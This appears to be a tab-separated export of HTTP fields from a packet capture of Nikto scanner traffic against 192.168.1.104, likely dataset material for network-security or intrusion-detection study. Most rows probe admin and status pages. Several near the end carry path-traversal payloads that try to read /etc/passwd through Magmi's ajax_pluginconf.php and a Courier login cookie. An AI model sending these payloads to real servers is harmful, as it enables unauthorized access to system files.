http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.104									17400						1	http://192.168.1.104/webmail/?admin		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007013)				/webmail/?admin
																	Keep-Alive										192.168.1.104									17402						1	http://192.168.1.104/wp-content/plugins/gravityforms/change_log.txt		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007014)				/wp-content/plugins/gravityforms/change_log.txt
																	Keep-Alive										192.168.1.104									17404						1	http://192.168.1.104/wordpresswp-content/plugins/gravityforms/change_log.txt		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007014)				/wordpresswp-content/plugins/gravityforms/change_log.txt
																	Keep-Alive										192.168.1.104									17406						1	http://192.168.1.104/manager/status		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007015)				/manager/status
																	Keep-Alive										192.168.1.104									17408						1	http://192.168.1.104/jk-manager/status		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007015)				/jk-manager/status
																	Keep-Alive										192.168.1.104									17410						1	http://192.168.1.104/jk-status/status		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007015)				/jk-status/status
																	Keep-Alive										192.168.1.104									17412						1	http://192.168.1.104/admin/status		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007015)				/admin/status
																	Keep-Alive										192.168.1.104									17414						1	http://192.168.1.104/host-manager/status		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007015)				/host-manager/status
																	Keep-Alive										192.168.1.104									17416						1	http://192.168.1.104/manager/status		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007016)				/manager/status
																	Keep-Alive										192.168.1.104									17418						1	http://192.168.1.104/jk-manager/status		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007016)				/jk-manager/status
																	Keep-Alive										192.168.1.104									17420						1	http://192.168.1.104/jk-status/status		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007016)				/jk-status/status
																	Keep-Alive										192.168.1.104									17422						1	http://192.168.1.104/admin/status		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007016)				/admin/status
																	Keep-Alive										192.168.1.104									17424						1	http://192.168.1.104/host-manager/status		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007016)				/host-manager/status
																	Keep-Alive										192.168.1.104									17426						1	http://192.168.1.104/manager/login.jsp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007017)				/manager/login.jsp
																	Keep-Alive										192.168.1.104									17428						1	http://192.168.1.104/jk-manager/login.jsp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007017)				/jk-manager/login.jsp
																	Keep-Alive										192.168.1.104									17430						1	http://192.168.1.104/jk-status/login.jsp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007017)				/jk-status/login.jsp
																	Keep-Alive										192.168.1.104									17432						1	http://192.168.1.104/admin/login.jsp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007017)				/admin/login.jsp
																	Keep-Alive										192.168.1.104									17434						1	http://192.168.1.104/host-manager/login.jsp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007017)				/host-manager/login.jsp
																	Keep-Alive										192.168.1.104									17436						1	http://192.168.1.104/server-status		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007018)				/server-status
																	Keep-Alive										192.168.1.104									17438						1	http://192.168.1.104/server-info		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007019)				/server-info
																	Keep-Alive										192.168.1.104									17440						1	http://192.168.1.104/README.mediawiki		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007020)				/README.mediawiki
																	Keep-Alive										192.168.1.104									17442						1	http://192.168.1.104/doc/RELEASE		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007021)				/doc/RELEASE
																	Keep-Alive										192.168.1.104									17444						1	http://192.168.1.104/mantis/doc/RELEASE		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007021)				/mantis/doc/RELEASE
																	Keep-Alive										192.168.1.104									17446						1	http://192.168.1.104/mantisbt/doc/RELEASE		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007021)				/mantisbt/doc/RELEASE
																	Keep-Alive										192.168.1.104									17448						1	http://192.168.1.104/VERSION		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007022)				/VERSION
																	Keep-Alive										192.168.1.104									17450						1	http://192.168.1.104/wiki/VERSION		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007022)				/wiki/VERSION
																	Keep-Alive										192.168.1.104									17452						1	http://192.168.1.104/dokuwiki/VERSION		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007022)				/dokuwiki/VERSION
																	Keep-Alive										192.168.1.104									17454						1	http://192.168.1.104/solr/#/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007023)				/solr/#/
																	Keep-Alive										192.168.1.104															1	http://192.168.1.104/sixcms/admin/login/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007024)				/sixcms/admin/login/
																	Keep-Alive										192.168.1.104									17464						1	http://192.168.1.104/index.php?action=login.index		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007025)				/index.php?action=login.index
																	Keep-Alive										192.168.1.104									17468						1	http://192.168.1.104/rockmongo/index.php?action=login.index		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007025)				/rockmongo/index.php?action=login.index
																	Keep-Alive										192.168.1.104									17470						1	http://192.168.1.104/rock-mongo/index.php?action=login.index		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007025)				/rock-mongo/index.php?action=login.index
																	Keep-Alive										192.168.1.104									17472						1	http://192.168.1.104/index.php?action=admin.index		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007026)				/index.php?action=admin.index
																	Keep-Alive										192.168.1.104									17474						1	http://192.168.1.104/rockmongo/index.php?action=admin.index		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007026)				/rockmongo/index.php?action=admin.index
																	Keep-Alive										192.168.1.104									17476						1	http://192.168.1.104/rock-mongo/index.php?action=admin.index		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007026)				/rock-mongo/index.php?action=admin.index
																	Keep-Alive										192.168.1.104									17478						1	http://192.168.1.104/humans.txt		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007027)				/humans.txt
																	Keep-Alive										192.168.1.104									17480						1	http://192.168.1.104/wba/home.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007028)				/wba/home.html
																	Keep-Alive										192.168.1.104									17482						1	http://192.168.1.104/axesde/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007029)				/axesde/
																	Keep-Alive										192.168.1.104									17484						1	http://192.168.1.104/ts/skins/ts_basic.html?lang=en/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007031)				/ts/skins/ts_basic.html?lang=en/
																	Keep-Alive										192.168.1.104									17486						1	http://192.168.1.104/ts/dev/index.html?lang=en/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007032)				/ts/dev/index.html?lang=en/
																	Keep-Alive										192.168.1.104									17488						1	http://192.168.1.104/wba/browser_test.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007033)				/wba/browser_test.html
																	Keep-Alive										192.168.1.104									17490						1	http://192.168.1.104/echo		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007034)				/echo
																	Keep-Alive										192.168.1.104									17492						1	http://192.168.1.104/cgi-bin/lansaweb?about		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007035)				/cgi-bin/lansaweb?about
																	Keep-Alive										192.168.1.104									17494						1	http://192.168.1.104/3rdparty/phpMyAdmin/doc/html/index.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007036)				/3rdparty/phpMyAdmin/doc/html/index.html
																	Keep-Alive										192.168.1.104									17496						1	http://192.168.1.104/phpMyAdmin/doc/html/index.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007036)				/phpMyAdmin/doc/html/index.html
																	Keep-Alive										192.168.1.104									17498						1	http://192.168.1.104/3rdparty/phpmyadmin/doc/html/index.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007036)				/3rdparty/phpmyadmin/doc/html/index.html
																	Keep-Alive										192.168.1.104									17500						1	http://192.168.1.104/phpmyadmin/doc/html/index.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007036)				/phpmyadmin/doc/html/index.html
																	Keep-Alive										192.168.1.104									17502						1	http://192.168.1.104/pma/doc/html/index.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007036)				/pma/doc/html/index.html
																	Keep-Alive										192.168.1.104									17504						1	http://192.168.1.104/3rdparty/phpMyAdmin/docs/html/index.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007037)				/3rdparty/phpMyAdmin/docs/html/index.html
																	Keep-Alive										192.168.1.104									17506						1	http://192.168.1.104/phpMyAdmin/docs/html/index.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007037)				/phpMyAdmin/docs/html/index.html
																	Keep-Alive										192.168.1.104									17508						1	http://192.168.1.104/3rdparty/phpmyadmin/docs/html/index.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007037)				/3rdparty/phpmyadmin/docs/html/index.html
																	Keep-Alive										192.168.1.104									17510						1	http://192.168.1.104/phpmyadmin/docs/html/index.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007037)				/phpmyadmin/docs/html/index.html
																	Keep-Alive										192.168.1.104									17512						1	http://192.168.1.104/pma/docs/html/index.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007037)				/pma/docs/html/index.html
																	Keep-Alive										192.168.1.104									17514						1	http://192.168.1.104/mod_gzip_status		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007038)				/mod_gzip_status
																	Keep-Alive										192.168.1.104									17516						1	http://192.168.1.104/courier/intermediate_login.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007039)			statecode=../../../../../../../../../etc/passwd%00	/courier/intermediate_login.html
																	Keep-Alive		39	39	application/x-www-form-urlencoded						192.168.1.104									17518						1	http://192.168.1.104/tws/getStatus		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007040)				/tws/getStatus
																	Keep-Alive										192.168.1.104									17520						1	http://192.168.1.104/rails/info/properties/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007041)				/rails/info/properties/
																	Keep-Alive										192.168.1.104									17522						1	http://192.168.1.104/rails/info/routes/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007042)				/rails/info/routes/
																	Keep-Alive										192.168.1.104									17524						1	http://192.168.1.104/wps/wsdl		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007043)				/wps/wsdl
																	Keep-Alive										192.168.1.104									17526						1	http://192.168.1.104/wps/portal/Home/Welcome/!ut/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007044)				/wps/portal/Home/Welcome/!ut/
																	Keep-Alive										192.168.1.104									17528						1	http://192.168.1.104/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007045)				/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility
																	Keep-Alive										192.168.1.104									17530						1	http://192.168.1.104/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007045)				/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility
																	Keep-Alive										192.168.1.104									17532						1	http://192.168.1.104/magmi-importer/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007045)				/magmi-importer/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility
																	Keep-Alive										192.168.1.104									17534						1	http://192.168.1.104/magento/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007045)				/magento/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility
																	Keep-Alive										192.168.1.104									17536						1	http://192.168.1.104/magento/magmi-importer/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007045)				/magento/magmi-importer/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility
																	Keep-Alive										192.168.1.104									17538						1	http://192.168.1.104/shop/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007045)				/shop/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility
